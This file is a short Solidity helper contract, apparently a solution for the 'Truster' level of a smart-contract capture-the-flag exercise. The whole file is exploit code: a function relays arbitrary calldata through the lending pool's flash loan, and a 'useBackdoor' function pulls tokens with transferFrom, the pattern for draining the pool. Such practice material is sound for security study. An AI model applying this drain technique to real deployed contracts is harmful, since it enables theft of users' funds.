// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {ERC20} from "solmate/tokens/ERC20.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract ExploitHelper {
    address token;
    constructor(address _token){
        token = _token;
    }

    function doFlashLoan(address pool, uint256 amount, address borrower, address target, bytes calldata data) external {
        TrusterLenderPool(pool).flashLoan(amount, borrower, target, data);
    }

    function useBackdoor(address owner, address newOwner, uint256 amount) external {
        ERC20(token).transferFrom(owner, newOwner, amount);
    }
}
